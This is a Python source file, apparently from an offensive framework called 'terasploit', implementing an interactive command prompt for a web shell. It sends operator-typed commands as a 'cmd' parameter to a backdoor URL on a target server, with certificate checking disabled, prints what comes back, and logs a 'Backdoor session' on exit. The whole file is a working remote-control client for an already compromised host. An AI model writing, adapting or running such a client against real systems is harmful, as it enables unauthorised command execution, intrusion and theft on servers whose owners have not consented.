from libs.terasploit.framework.clients.http.http_client import HTTPClient
from init.tsf.ui.wildcard import info_print, s

import os
import time
import logging

logger = logging.getLogger()

class CommandPrompt:
    def __init__(self, shell: str = '', host: str = '') -> None:
        self.shell = shell
        self.host = host
        self.check_shell()
        
        
    def check_shell(self):
        shell = HTTPClient.Request('get',url=self.shell)
        if shell.status_code == 200:
            info_print(f'Shell checked, status code: {shell.status_code}.',downlinebreak=True)
            self.prompt()
        else:
            info_print(f'Shell checked, failed to continue. Status code: {shell.status_code}.')
            return
        
        
    def output(self,command) -> str:
        content = HTTPClient.Request('get',url=self.shell,params={'cmd':command},verify=False)
        return content.text
    
    
    def prompt(self):
        while True:
            try:
                user = input(f'{s.UNDERLINE}shell{s.RESET_ALL} > ')
                if user.lower() == 'clear' or user.lower() == 'cls':
                    os.system('clear')
                    continue
                if user.lower() == 'exit':
                    logger.info('Backdoor session complete.')
                    break
                
                time.sleep(1) # to avoid flooding the target with requests
                
                result = self.output(user)
                if not result:
                    pass
                else:
                    text = result.splitlines()
                    for line in text:
                        if not line:
                            pass
                        else:
                            print (line)

            except KeyboardInterrupt:
                pass
            except Exception as error:
                info_print (error,type='red')